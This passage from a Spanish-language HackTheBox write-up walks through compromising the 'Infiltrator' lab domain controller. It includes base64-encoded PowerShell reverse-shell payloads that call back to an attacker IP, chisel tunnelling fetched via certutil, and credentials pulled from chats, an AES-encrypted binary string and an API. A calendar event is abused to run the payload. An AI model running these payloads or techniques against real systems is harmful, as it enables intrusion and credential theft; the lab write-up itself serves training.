ArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
~~~

Al ejecutar el comando, desde nuestro listener recibiremos la conexión, haremos `Ctrl + Z` y volveremos al proceso, similar a como hacemos un tratamiento en Linux

~~~ bash
connect to [10.10.14.191] from (UNKNOWN) [10.10.11.31] 52992

[1]  + 25040 suspended  rlwrap -cAr nc -lvnp 4444
root@parrot exploits # stty raw -echo; fg
[1]  + 25040 continued  rlwrap -cAr nc -lvnp 4444

PS C:\Users\M.harris\Documents> 
~~~

En este punto ya podremos ver la flag del usuario sin privilegios

~~~ bash
PS C:\Users\M.harris\Documents> type ..\Desktop\user.txt 
a79...
~~~
<br>


# Escalada de Privilegios
---
## Internally Open Ports

Si listamos los puertos que se encuentran activos, podremos ver algunos servicios inusuales

~~~ bash
PS C:\Temp> netstat -ano | findstr LISTENING 
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       908
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       908
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       8
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2772
  TCP    0.0.0.0:14118          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14119          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14121          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14122          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14123          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14125          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14126          0.0.0.0:0              LISTENING       5228
  TCP    0.0.0.0:14127          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14128          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14130          0.0.0.0:0              LISTENING       7080
  TCP    0.0.0.0:14406          0.0.0.0:0              LISTENING       5792
  ...
  ...
~~~

Al listar las carpetas dentro de `Program Files` en busca de algún servicio instalado, veremos los directorios `Output Messenger` y `Output Messenger Server`

~~~ bash
*Evil-WinRM* PS C:\Users\M.harris\Documents> dir "C:\Program Files"

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/4/2023   9:22 AM                Common Files
d-----        8/21/2024   1:50 PM                Hyper-V
d-----        2/19/2024   3:52 AM                internet explorer
d-----        2/23/2024   5:06 AM                Output Messenger
d-----         6/7/2025  12:03 AM                Output Messenger Server
d-----       12/12/2023  10:04 AM                PackageManagement
d-----        2/19/2024   4:16 AM                Update Services
d-----        12/4/2023   9:23 AM                VMware
d-r---        11/5/2022  12:03 PM                Windows Defender
d-----        8/21/2024   1:50 PM                Windows Defender Advanced Threat Protection
d-----        11/5/2022  12:03 PM                Windows Mail
d-----        8/21/2024   1:50 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----       12/12/2023  10:04 AM                WindowsPowerShell
~~~


## Output Messenger Analysis

Realizando una pequeña investigación sobre [Output Messenger](https://support.outputmessenger.com/connect-to-server-from-internet/#Router_and_NAT_configuration_by_port_forwarding), encontraremos lo siguiente: 

> Estos son los puertos que necesitan ser abiertos en el Firewall, desde el `14121` al `14124` 
> `14121 TCP` – Application  
> `14122 TCP` – File Transfer
> `14123 TCP` – Web server for Browser Version
> `14124 TCP` & UDP – VoIP for Voice/Video/Desktop Sharing
> `14127` to `14129` ports are used internally. (No need to add in Firewall)


## Port Forwarding - `chisel`

 Haremos estos puertos alcanzables por nuestra máquina mediante un reenvío de puertos. Primero instalaremos `chisel` o un cliente con el que podamos iniciar un proxy hacia nuestra máquina.

En mi caso compartiré el binario de `chisel.exe` mediante un servidor HTTP desde mi máquina

~~~ bash
python3 -m http.server 80
~~~

En la máquina víctima, descargamos el binario, y lo guardamos con un nombre seguido de la extensión `.exe`

~~~ bash
PS C:\Temp> certutil -urlcache -f http://10.10.14.99/chisel.exe c.exe
~~~

### SOCKS5 Proxy Setup

Iniciaremos `chisel` en modo servidor desde nuestra máquina atacante, en mi caso he elegido el puerto `8000`

~~~ bash
./chisel server -p 8000 --reverse
2025/06/07 18:21:58 server: Reverse tunnelling enabled
2025/06/07 18:21:58 server: Fingerprint HHERjjwUkyQgC1DMTuODFXL5wdkV7uq6+xTmhq5TEhY=
2025/06/07 18:21:58 server: Listening on http://0.0.0.0:8000
~~~

Ahora desde la máquina víctima nos conectaremos haciendo un reenvío dinámico a nuestro puerto `8000`

~~~ bash
PS C:\Temp> ./chisel.exe client 10.10.14.99:8000 R:socks
~~~

Desde el servidor `chisel` veremos cómo se inicia una sesión por el puerto `1080`, **es por aquí donde circulará el tráfico hacia el DC**

~~~ bash
2025/06/07 18:22:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
~~~


## Output Messenger - Session as `k.turner`

Ahora podremos ir al navegador para acceder vía web desde el puerto `14123`

![image-center](/assets/images/posts/infiltrator-output-messenger-1.png)
{: .align-center}

Ingresaremos con las credenciales que habíamos encontrado en la fase de reconocimiento

~~~ bash
k.turner:MessengerApp@Pass!
~~~

Al ingresar veremos los chats con los distintos usuarios y grupos

![image-center](/assets/images/posts/infiltrator-output-messenger-2.png)
{: .align-center}


## Output Messenger - Linux Client

Tenemos la opción de instalar `Output Messenger` en Linux para poder conectarnos al servicio y aprovechar las funcionalidades que no están disponibles en la aplicación web, la descarga está disponible desde el siguiente enlace de la [web oficial](https://www.outputmessenger.com/lan-messenger-downloads/).

Podemos usar el túnel SOCKS que tenemos abierto en el puerto `1080` con `proxychains` para abrir `Output Messenger`

> Podremos tener ciertos inconvenientes al usar `proxychains4`, por lo que podemos optar por usar `proxychains3` para tener una solución momentánea
{: .notice--danger}

~~~ bash
proxychains3 outputmessenger
~~~


## Output Messenger - Auth as `k.turner`

Nos conectaremos como el usuario `K.Turner` y el servidor al que nos conectaremos debe ser `127.0.0.1`, ya que usaremos el túnel SOCKS para conectarnos

![image-center](/assets/images/posts/infiltrator-output-messenger-as-k-turner.png)
{: .align-center}

Al conectarnos veremos el siguiente panel, donde tenemos más opciones que la versión web

![image-center](/assets/images/posts/infiltrator-output-messenger-as-k-turner-2.png)
{: .align-center}

Iremos a la sección `My Wall` haciendo click en el penúltimo ícono de la barra lateral, que parece un muro. Donde se muestran los siguientes mensajes.

Con el primer mensaje ya entendemos por qué pudimos explotar `AS-REP Roast`. Respecto al segundo, se menciona un proyecto de una app para buscar usuarios del dominio

![image-center](/assets/images/posts/infiltrator-output-messenger-as-k-turner-3.png)
{: .align-center}

Se muestra la contraseña del usuario `m.harris`, la podemos validar con `netexec`

> Procura utilizar autenticación `kerberos` con el parámetro `-k`, para evitar el error `STATUS_ACCOUNT_RESTRICTION`, que ocurre porque el usuario es miembro del grupo `Protected Users`, puedes aprender más en este [artículo](https://www.manageengine.com/products/active-directory-audit/learn/what-are-protected-user-groups-in-active-directory.html)
{: .notice--warning}

~~~ bash
nxc smb dc01.infiltrator.htb -u m.harris -p 'D3v3l0p3r_Pass@1337!' -k 
SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\m.harris:D3v3l0p3r_Pass@1337!
~~~


## Output Messenger - Auth as `m.harris`

Usaremos esta contraseña para ingresar a `OutputMessenger` como el usuario `m.harris`

~~~ bash
m.harris:D3v3l0p3r_Pass@1337!
~~~ 

![image-center](/assets/images/posts/infiltrator-output-messenger-as-m-harris.png)
{: .align-center}

Una vez estemos dentro de los chats, abriremos el chat con `Admin` quien comparte un archivo `UserExplorer.exe`

![image-center](/assets/images/posts/infiltrator-output-messenger-as-m-harris-2.png)
{: .align-center}

Al intentar descargarlo desde Linux, ocasionaremos errores como el siguiente

~~~ bash
Uncaught Exception: Error: ENOENT: no such file or directory, mkdir 'undefined/Feb 2024'
    at Object.mkdirSync (node:fs:1372:26)
    at socks.<anonymous> (file:///usr/lib/outputmessenger/resources/app.asar/OUMProcess.mjs:11144:20)
~~~


## Output Messenger - Forwarding to Windows Client

Cambiaremos a una máquina Windows para poder descargar este archivo. Para no complicarnos con abrir el archivo de VPN en esta nueva máquina virtual, podemos redirigir el tráfico desde nuestro Linux con `socat` y correr el servidor `chisel` en nuestra máquina Windows.

~~~ bash
socat TCP-LISTEN:8000,fork TCP:192.168.29.144:8000
~~~

- `192.168.29.144 -> Windows 10 Local`

Instalaremos [chisel](https://github.com/jpillora/chisel/releases) para Windows e iniciaremos un servidor por un puerto, en mi caso he vuelto a elegir el puerto `8000`

~~~ bash
C:\Users\Andrew>.\chisel.exe server -p 8000 --reverse
2025/06/15 18:05:38 server: Reverse tunnelling enabled
2025/06/15 18:05:39 server: Fingerprint S/SmsIDUgSgN+qURpqUS+BOfvHioIItAjATLKG7cTLE=
2025/06/15 18:05:39 server: Listening on http://0.0.0.0:8000
~~~

> Considera deshabilitar el `firewall` y la protección en tiempo real de `Windows Defender` de forma temporal, de lo contrario no podremos ni siquiera ejecutar `chisel`.
{: .notice--warning}

Reenviaremos los siguientes puertos, que serán los justos y necesarios para poder utilizar el servicio de `Output Messenger`

~~~ powershell
*Evil-WinRM* PS C:\Users\M.harris\Documents> .\c.exe client 10.10.14.191:8000 R:14121:127.0.0.1:14121 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126
~~~

En nuestro servidor `chisel` recibiremos las conexiones correspondientes, donde se abrirán los puertos necesarios para conectarnos a `Output Messenger` de forma correcta

~~~ bash
C:\Users\Andrew>.\chisel.exe server -p 8000 --reverse
2025/06/15 18:05:38 server: Reverse tunnelling enabled
2025/06/15 18:05:39 server: Fingerprint S/SmsIDUgSgN+qURpqUS+BOfvHioIItAjATLKG7cTLE=
2025/06/15 18:05:39 server: Listening on http://0.0.0.0:8000
2025/06/15 18:06:18 server: session#1: tun: proxy#R:14121=>14121: Listening
2025/06/15 18:06:18 server: session#1: tun: proxy#R:14125=>14125: Listening
2025/06/15 18:06:18 server: session#1: tun: proxy#R:14126=>14126: Listening
~~~

Luego de un dolor de cabeza y unos cuantos cafés, por fin pude conectarme y descargar el archivo `UserExplorer.exe` desde el chat con `Admin`, **recuerda la ruta donde se guarda el archivo**

![image-center](/assets/images/posts/infiltrator-output-messenger-as-m-harris-3.png)
{: .align-center}


## Binary Analysis - `dnSPY`

Analizaremos el código de este ejecutable con la herramienta [dnSPY](https://dnspy.org/). Veremos la siguiente lógica en la función `main`, donde al parecer, se autentica por el protocolo LDAP.

![image-center](/assets/images/posts/infiltrator-binary-analysis.png)
{: .align-center}

La parte clave está en la siguiente línea de código donde se desencripta la variable `cipherText` con el método `DecryptString`

~~~ bash
text2 = Decryptor.DecryptString("b14ca5898a4e4133bbce2ea2315a1916", cipherText);
~~~

Si nos dirigimos a la clase `Decryptor`, veremos de qué forma lo hace

![image-center](/assets/images/posts/infiltrator-binary-analysis-2.png)
{: .align-center}


## AES CBC Mode Decrypt

El método `DecryptString` desencripta el `cipherText` (una cadena en `base64`) usando `AES` en modo CBC con `IV` en cero, clave de 16 bytes. Nos dirigiremos a [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'b14ca5898a4e4133bbce2ea2315a1916'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=U0txd1FrODF0Z3ErQzNWN3B6YzFTQT09&oeol=CR) para replicar el proceso de desencriptado.

> En el contexto del cifrado AES, IV significa **Vector de Inicialización** (`Initialization Vector`). Es un valor aleatorio o pseudoaleatorio que se utiliza en ciertos modos de operación del cifrado AES para asegurar que el mismo texto plano no genere siempre el mismo texto cifrado
{: .notice--info}

> En AES, el modo CBC (Cipher Block Chaining) es una forma de cifrado por bloques que mejora la seguridad al encadenar los bloques de datos
{: .notice--info}

En la siguiente imagen podremos ver cómo funciona un poco el proceso de encriptado en modo CBC

![image-center](/assets/images/posts/infiltrator-aes-cbc.png)
{: .align-center}

Tenemos la siguiente información para poder desencriptar las credenciales para la cuenta `winrm_svc`

~~~ text
Texto: TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE= (Base64)
Algoritmo: AES en modo CBC
Clave estática: b14ca5898a4e4133bbce2ea2315a1916 (UTF-8)
Vector de Inicialización: 16 bytes con valor 0 (HEX)
~~~

Armaremos la "receta" para desencriptar la variable `cipherText` 

![image-center](/assets/images/posts/infiltrator-decrypt-aes.png)
{: .align-center}

Nos quedará una cadena en `base64`, haremos el mismo proceso para esta nueva cadena. Si reemplazamos el `Input` por esta cadena, podremos ver las credenciales en texto claro

![image-center](/assets/images/posts/infiltrator-decrypt-aes-2.png)
{: .align-center}

Vemos la contraseña para la cuenta `winrm_svc`, podemos validar esta contraseña con la ayuda de `netexec` frente al protocolo `winrm`. Cuando el mensaje es `Pwn3d!`, sabremos que la cuenta es miembro del grupo `Remote Management Users`

~~~ bash
nxc winrm dc01.infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'       
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P (Pwn3d!)
~~~


## Shell as `winrm_svc`

Lógicamente la credencial es válida y podremos conectarnos al DC con `evil-winrm`

~~~ bash
evil-winrm -i dc01.infiltrator.htb -u winrm_svc -p 'WinRm@$svc^!^P'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
infiltrator\winrm_svc
~~~


## Output Messenger - Auth as `winrm_svc`

Nos conectaremos a Output Messenger con la cuenta `winrm_svc`. Si nos vamos a la sección de `Note` en el cuarto ícono, veremos la siguiente nota con una `API Key`

![image-center](/assets/images/posts/infiltrator-output-messenger-as-winrm-svc.png)
{: .align-center}


## Output Messenger API

Output Messenger cuenta con una [API](https://support.outputmessenger.com/authentication-api/ )que funciona como una herramienta de colaboración en mensajería LAN.

Aparentemente parece ser que debemos utilizar la cuenta `lan_management_svc` para autenticarnos dentro de la API

~~~ bash
lan_managment:558R501T5I6024Y8JV3B7KOUN1A518GG
~~~

### Users

Existe el endpoint `/users`, donde podemos listar a los usuarios existentes dentro de este servicio. En la documentación, se detalla el uso de esta API con las siguientes cabeceras

~~~ http
GET /api/users  
Accept: application/json, text/javascript, */*;  
API-KEY: PP3S67BYL8Y260D44887M3W655U7137X 
Host: myserver:14125
~~~

Utilizaremos la `API Key` en la cabecera `API-KEY` al enviar la solicitud HTTP y listar usuarios

~~~ bash
curl -s http://localhost:14125/api/users -H ' Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' | jq             
{
  "rows": [
    {
      "user": "admin",
      "displayname": "Admin",
      "group": "Administration",
      "role": "A",
      "email": "",
      "phone": "",
      "title": "",
      "status": "online"
    },
    ...
    ...
~~~

### Chatrooms

Dentro de la documentación de la API, podremos ver que es posible listar los [chatrooms](https://support.outputmessenger.com/chat-room-api/)

~~~ bash
curl -s http://localhost:14125/api/chatrooms -H ' Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' | jq 
{
  "rows": [
    {
      "room": "Chiefs_Marketing_chat",
      "roomusers": "O.martinez|0,A.walker|0"
    },
    {
      "room": "Dev_Chat",
      "roomusers": "Admin|0,M.harris|0,K.turner|0,Developer_01|0,Developer_02|0,Developer_03|0"
    },
    {
      "room": "General_chat",
      "roomusers": "Admin|0,D.anderson|0,L.clark|0,M.harris|0,O.martinez|0,A.walker|0,K.turner|0,E.rodriguez|0,winrm_svc|0,Developer_01|0,Developer_02|0,Developer_03|0"
    },
    {
      "room": "Marketing_Team_chat",
      "roomusers": "D.anderson|0,L.clark|0"
    }
  ],
  "success": true
}
~~~

Hasta ahora no hemos podido acceder al chat de `Chiefs_Marketing_chat`, porque no hemos iniciado sesión aún como los usuarios `O.Martinez` o  `A.walker`. Existe un endpoint `/logs` donde en teoría podemos ver historial de chatrooms, pero necesitamos el valor `roomkey`

~~~ http
GET    /api/chatrooms/logs?_**[roomkey]**_=a_20160805110823@conference.com&_**[fromdate]**_=2018/07/24&_**[todate]=**_2018/07/25
~~~

### Finding Files

Si listamos recursivamente en busca de archivos dentro de la carpeta `AppData` de la cuenta `winrm_svc`, veremos unos archivos `.db3`

~~~ powershell
*Evil-WinRM* PS C:\Users\winrm_svc\AppData> Get-ChildItem -Recurse

    Directory: C:\Users\winrm_svc\AppData\Roaming\Output Messenger


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   7:20 AM                JAAA
-a----        2/25/2024   7:20 AM            948 OutputMessenger.log


    Directory: C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   7:20 AM                Audios
d-----        2/25/2024   7:20 AM                CalendarFiles
d-----        2/25/2024   7:26 AM                Log
d-----        2/25/2024   7:20 AM                MailInbox
d-----        2/25/2024   7:20 AM                MailSent
d-----        2/25/2024   7:20 AM                Received Files
d-----        2/25/2024   7:20 AM                Screenshots
d-----        2/25/2024   7:20 AM                Temp
d-----        2/25/2024   7:20 AM                Theme
-a----        2/25/2024   7:20 AM          29696 OM.db3
-a----        2/25/2024   7:20 AM          13312 OT.db3
~~~

Descargaremos los archivos rápidamente con el comando `download`, que es posible gracias a la herramienta `evil-winrm`

~~~ bash
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA> download OM.db3 
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA> download OT.db3
~~~


## `sqlite` Database Analysis

Podemos comprobar que los archivos son bases de datos de `sqlite3`

~~~ bash
file OM.db3   

OM.db3: SQLite 3.x database, last written using SQLite version 3008006, page size 1024, file counter 33, database pages 29, cookie 0xf, schema 4, UTF-8, version-valid-for 33
~~~

Podemos usar el comando `sqlite3` para listar el contenido que hay dentro de estas bases de datos para buscar el valor `chatroomkey` que necesitamos para ver los logs

~~~ bash
sqlite3 OM.db3 .dump | grep chatroom
                [chatroom_key] NVARCHAR(100),
CREATE TABLE [om_chatroom] (
                  [chatroom_id] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
                  [chatroom_name] NVARCHAR(50),
                  [chatroom_key] NVARCHAR(50),
                  [chatroom_new_name] NVARCHAR(100),
                  [chatroom_new_key] NVARCHAR(100),
                  [chatroom_notification] BOOLEAN,
INSERT INTO om_chatroom VALUES(1,'General_chat','20240219160702@conference.com','General_chat','','20240219160702@conference.com',1,'2024-02-20 01:07:02.909',0,0,NULL,0,0,1,NULL,NULL);
INSERT INTO om_chatroom VALUES(2,'Chiefs_Marketing_chat','20240220014618@conference.com','Chiefs_Marketing_chat','','20240220014618@conference.com',1,'2024-02-20 10:46:18.858',0,0,NULL,0,0,1,NULL,NULL);
CREATE TABLE [om_chatroom_user] (
                [chatroom_user_id] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
                [chatroom_id] INTEGER CONSTRAINT [chatroomusers_foreignkey] REFERENCES [om_chatroom]([chatroom_id]) ON DELETE CASCADE ON UPDATE NO ACTION,
INSERT INTO om_chatroom_user VALUES(1,1,6,'M',1,'');
INSERT INTO om_chatroom_user VALUES(2,1,1,'M',1,'');
INSERT INTO om_chatroom_user VALUES(3,1,2,'M',1,'');
INSERT INTO om_chatroom_user VALUES(4,1,10,'M',1,'');
INSERT INTO om_chatroom_user VALUES(5,1,11,'M',1,'');
INSERT INTO om_chatroom_user VALUES(6,1,12,'M',1,'');
INSERT INTO om_chatroom_user VALUES(7,1,8,'M',1,'');
INSERT INTO om_chatroom_user VALUES(8,1,7,'M',1,'');
INSERT INTO om_chatroom_user VALUES(9,1,3,'M',1,'');
INSERT INTO om_chatroom_user VALUES(10,1,4,'M',1,'');
INSERT INTO om_chatroom_user VALUES(11,1,5,'M',1,'');
INSERT INTO om_chatroom_user VALUES(12,1,9,'M',1,'');
INSERT INTO om_chatroom_user VALUES(13,2,6,'M',1,'');
INSERT INTO om_chatroom_user VALUES(14,2,5,'M',1,'');
INSERT INTO sqlite_sequence VALUES('om_chatroom',2);
INSERT INTO sqlite_sequence VALUES('om_chatroom_user',14);
~~~

Encontramos el valor `roomkey` que buscábamos para el chatroom `Chiefs_Marketing_chat`

~~~ text
20240220014618@conference.com
~~~

### Viewing `Chiefs_Marketing_chat` Logs

Si hacemos nuevamente la solicitud HTTP enviando el parámetro `roomkey` correspondiente, veremos la conversación entre los usuarios de este chat, donde al final podremos ver que se comparten las credenciales de `O.martinez` 

~~~ bash
curl -s 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2018/07/24&todate=2025/07/25' -H ' Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' | jq

...
...
By the way, I need to check something in your account. Could you share your username password?</div><br /></div><div id='greybk'><span class='nickname' >O.martinez Says: </span><div class='msg_time'>02:09 AM</div><br /><div  class='bullet'><img src='/Temp/bullets.png' class='read' title='' /></div><div class='msg_body' >sure!</div><br /></div><div id='greybk'><span class='nickname' >O.martinez Says: </span><div class='msg_time'>02:09 AM</div><br /><div  class='bullet'><img src='/Temp/bullets.png' class='read' title='' /></div><div class='msg_body' >O.martinez : m@rtinez@1996!</div><br /></div></div>"
}
~~~

Tenemos las siguientes credenciales para el usuario `O.martinez`

~~~ bash
O.martinez:m@rtinez@1996!
~~~


## Output Messenger - Auth as `O.martinez`

Si ingresamos a Output Messenger con esta cuenta, podremos ver lo que vimos en la API

![image-center](/assets/images/posts/infiltrator-output-messenger-as-o-martinez.png)
{: .align-center}


## Abusing Output Messenger Calendar

Agregaremos un nuevo evento `Run Application` que ejecute una reverse shell hacia nuestra máquina atacante

![image-center](/assets/images/posts/infiltrator-output-messenger-calendar.png)
{: .align-center}

Crearemos un payload que ejecute una [reverse shell](https://www.revshells.com/) hacia nuestra máquina atacante con un comando de `powershell` en `base64`, y lo guardaremos en una archivo `.bat`

> `shell.bat`

~~~ bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
~~~

Alojaremos este archivo malicioso en nuestra máquina Windows que usamos como cliente para conectarnos a Output Messenger, podemos transferirlo de la siguiente manera rápidamente

~~~ bash
impacket-smbserver share $(pwd) -smb2support -user andrew -pass asdsa
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
~~~

Desde nuestra máquina Windows copiamos el archivo y lo alojamos en una ruta al igual que en el DC

~~~ bash
C:\> mkdir C:\Temp
C:\> cd C:\Temp
C:\Temp> net use \\192.168.29.137\share /user:andrew asdsa
Se ha completado el comando correctamente.

C:\Temp> copy \\192.168.29.137\share\shell.bat .
        1 archivo(s) copiado(s).
~~~

Ahora en la máquina víctima subiremos el archivo `.bat` en la misma ruta que en nuestro cliente Windows

~~~ bash
*Evil-WinRM* PS C:\Temp> upload shell.bat 
~~~

Le daremos permisos a todos los usuarios sobre este archivo para evitar conflictos en la hora de la ejecución

~~~ bash
*Evil-WinRM* PS C:\Temp> icacls.exe * /grant Everyone:F
processed file: shell.bat
Successfully processed 1 file; Failed processing 0 files
~~~

Ahora crearemos un nuevo evento, debemos asegurarnos de programar una hora cercana y estar a la escucha para recibir la conexión

![image-center](/assets/images/posts/infiltrator-output-messenger-calendar-2.png)
{: .align-center}

Es importante que sincronicemos el calendario con clic derecho `Sync Calendar` y `Refresh Calendar`

~~~ bash
rlwrap -cAr nc -lvnp 4444
~~~


## Shell as `O.martinez`

Cuando llegue la hora a la que pusimos el evento, se ejecutará el archivo `shell.bat` y nuestro listener recibirá una `powershell`

~~~
rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.248] from (UNKNOWN) [10.10.11.31] 58636
PS C:\Windows\system32> whoami
infiltrator\o.martinez
~~~


## Network Traffic Analysis - `.pcapng` File

Dentro del directorio `Received Files`, que es donde se guardan los archivos que recibe el usuario en Output Messenger, veremos un archivo `.pcapng`, que es un archivo que podremos analizar con Wireshark

> Un archivo `.pcapng` es un **formato de archivo para guardar datos de captura de tráfico de red**
{: .notice--info}

~~~ bash
PS C:\Users\O.martinez\AppData\Roaming\Output Messenger\FAAA\Received Files> tree /f
Folder PATH listing
Volume serial number is 96C7-B603
C:.
????202402
????202408
????202506
????203301
        network_capture_2024.pcapng
~~~

Podemos aprovechar nuestra capacidad para descargar archivos directamente con `evil-winrm`, sin embargo primero copiaremos este archivo a un directorio que nosotros controlemos

~~~ bash
PS C:\Users\O.martinez\AppData\Roaming\Output Messenger\FAAA\Received Files\203301> cp network_capture_2024.pcapng C:\Temp
~~~

Procederemos a descargar el archivo desde esta carpeta iniciando sesión con cualquier usuario con el que tengamos acceso

~~~ bash
*Evil-WinRM* PS C:\Temp> download network_capture_2024.pcapng
~~~

Abriremos el archivo de captura con Wireshark para analizarlo

~~~ bash
wireshark network_capture_2024.pcapng
~~~

![image-center](/assets/images/posts/infiltrator-wireshark.png)
{: .align-center}

